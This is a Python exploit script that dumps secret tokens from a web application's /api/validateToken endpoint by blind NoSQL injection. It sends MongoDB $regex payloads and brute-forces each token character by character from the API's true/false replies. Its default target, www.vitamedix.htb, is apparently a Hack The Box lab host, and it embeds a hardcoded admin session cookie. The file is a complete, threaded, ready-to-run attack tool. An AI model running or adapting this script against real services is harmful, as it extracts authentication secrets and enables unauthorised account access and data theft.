#!/usr/bin/env python3  
"""  
Dump tokens from /api/validateToken using a NoSQL regex boolean oracle.  
  
Oracle:  
  {"message":"true"}  -> prefix matches at least one token  {"message":"false"} -> no token matches the prefix  
Only lowercase letters and digits are brute-forced.  
"""  
  
import argparse  
import string  
from concurrent.futures import ThreadPoolExecutor, as_completed  
  
import requests  
from requests.adapters import HTTPAdapter  
from urllib3.util.retry import Retry  
  
DEFAULT_HOST = "www.vitamedix.htb"  
DEFAULT_COOKIE = (  
    "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."  
    "eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImRvY3RvciIsImlhdCI6MTc4NjM3MzkyMH0."    "FJkYqLtliOqBKd5hh67Ho95ForiTQ25XsWlC-E3rbB8")  
USER_AGENT = (  
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:152.0) "  
    "Gecko/20100101 Firefox/152.0")  
ALPHABET = string.ascii_lowercase + string.digits  
  
  
def build_session():  
    s = requests.Session()  
    retries = Retry(total=3, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504])  
    s.mount("http://", HTTPAdapter(max_retries=retries))  
    s.mount("https://", HTTPAdapter(max_retries=retries))  
    return s  
  
  
def is_true(resp):  
    try:  
        data = resp.json()  
    except Exception:  
        return False  
    return isinstance(data, dict) and str(data.get("message")).lower() == "true"  
  
  
def check_prefix(sess, url, headers, prefix, char):  
    payload = {"token": {"$regex": f"^{prefix}{char}.*"}}  
    try:  
        resp = sess.post(url, headers=headers, json=payload, timeout=15)  
    except requests.RequestException as exc:  
        return char, False, str(exc)  
    return char, is_true(resp), resp.status_code  
  
  
def dump_tokens(host, cookie, scheme, alphabet, max_depth, workers):  
    url = f"{scheme}://{host}/api/validateToken"  
    headers = {  
        "Host": host,  
        "User-Agent": USER_AGENT,  
        "Accept": "*/*",  
        "Accept-Language": "en-US,en;q=0.9",  
        "Accept-Encoding": "gzip, deflate, br",  
        "Connection": "keep-alive",  
        "Cookie": cookie,  
        "Upgrade-Insecure-Requests": "1",  
        "Priority": "u=0, i",  
        "Content-Type": "application/json",  
    }  
  
    sess = build_session()  
    queue = [""]  
    found = []  
  
    print(f"[*] Target: {url}")  
    print(f"[*] Alphabet: {alphabet!r} ({len(alphabet)} chars)")  
    print(f"[*] Workers: {workers}\n")  
  
    while queue:  
        prefix = queue.pop(0)  
        matches = []  
  
        with ThreadPoolExecutor(max_workers=workers) as ex:  
            futures = {ex.submit(check_prefix, sess, url, headers, prefix, ch): ch for ch in alphabet}  
            for future in as_completed(futures):  
                char, ok, status = future.result()  
                if ok:  
                    matches.append(char)  
                    print(f"[+] prefix '{prefix}{char}' matched (HTTP {status})")  
                elif not isinstance(status, int):  
                    print(f"[!] prefix '{prefix}{char}' error: {status}")  
  
        for char in sorted(matches):  
            candidate = prefix + char  
            if len(candidate) >= max_depth:  
                found.append(candidate)  
                print(f"[FOUND max-depth] {candidate}")  
                continue  
  
            # Is this the full token? Exact-match check.  
            resp = sess.post(url, headers=headers, json={"token": {"$regex": f"^{candidate}$"}}, timeout=15)  
            if is_true(resp):  
                found.append(candidate)  
                print(f"[FOUND TOKEN] {candidate}")  
            else:  
                queue.append(candidate)  
  
    print(f"\n[*] Total found: {len(found)}")  
    for token in found:  
        print(token)  
    return found  
  
  
def main():  
    parser = argparse.ArgumentParser(description="Dump tokens via NoSQL regex oracle")  
    parser.add_argument("--host", default=DEFAULT_HOST, help="Target host")  
    parser.add_argument("--cookie", default=DEFAULT_COOKIE, help="Session cookie")  
    parser.add_argument("--scheme", default="http", choices=["http", "https"])  
    parser.add_argument("--alphabet", default=ALPHABET, help="Characters to test")  
    parser.add_argument("--max-depth", type=int, default=64, help="Max token length")  
    parser.add_argument("--workers", type=int, default=8, help="Concurrent threads")  
    args = parser.parse_args()  
  
    dump_tokens(  
        host=args.host,  
        cookie=args.cookie,  
        scheme=args.scheme,  
        alphabet=args.alphabet,  
        max_depth=args.max_depth,  
        workers=args.workers,  
    )  
  
  
if __name__ == "__main__":  
    main()